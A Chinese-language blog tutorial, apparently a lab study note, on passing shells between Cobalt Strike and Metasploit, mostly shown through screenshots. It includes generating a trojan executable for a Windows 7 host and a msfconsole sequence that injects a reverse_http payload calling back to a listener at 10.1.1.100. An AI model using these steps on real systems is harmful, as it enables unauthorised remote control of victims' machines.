---
title: CobaltStrike学习三
mathjax: true
copyright: true
comment: true
date: 2019-10-16 16:35:10
tags: CobaltStrike
categories: 工具使用
---
能够与metasploit配合，可以相互派生shell，学会团队作战的理念，能够使用CS的协作功能。

<!-- more -->

---
## Cobalt strike派生shell给metasploit
- 前提有一个beaconshell

### 在metasploit处创建一个handler
![avatar](https://raw.githubusercontent.com/alpha302/cloudimg/master/KSBB%5D%7D%7E%60%608ODOHJ%5B%60GS.png)

### 使用cobaltstrike创建一个listener

这里port设置为创建msf的handler时的port
![avatar](https://raw.githubusercontent.com/alpha302/cloudimg/master/%7B1FG4M4%2495LS2%601NTIUP3.png)

### 利用已获得的beaconshell传给msf
chose 选择 msf这个listener

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/PGZGI0EXGA3CTJ7_T.png)

![avatar](https://raw.githubusercontent.com/alpha302/cloudimg/master/DT%60NMP.png)

这里我没有成功，cs传给metasploit失败。没找到原因

## metasploit派生shell给cobaltstrike
- 前提是有一个metasploit的session
- 删除之前的记录。先在cobaltstrike创建一个listener，用于接收msf的派生shell
### cobaltstrike创建一个listener

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/EH.png)


### metasploit获取session
生成metasploit的木马

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/S0%60V%7E10WXVKMD%25Y69.png)

开启监听

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/Q53E8%603VQ6X3%7EP.png)

利用web服务开启渠道，选择之前生成的恶意文件test.exe

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/JW81.png)

win7下载testexe,获得session

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/3BX7AAP.png)

### cs获得meta的shell
```shell 
meterpreter > background
msf5 exploit(multi/handler) > use exploit/windows/local/payload_inject
msf5 exploit(windows/local/payload_inject) > set payload windows/meterpreter/reverse_http
msf5 exploit(windows/local/payload_inject) > set lhost 10.1.1.100
msf5 exploit(windows/local/payload_inject) > set lport 7777
msf5 exploit(windows/local/payload_inject) > set session 1
msf5 exploit(windows/local/payload_inject) > run

```
此时cobaltstrike 已经获得metasploit的shell
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/eeeee.png)

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/CFDTZ2X5V%7E9R%25BX%7BB5FC521.png)
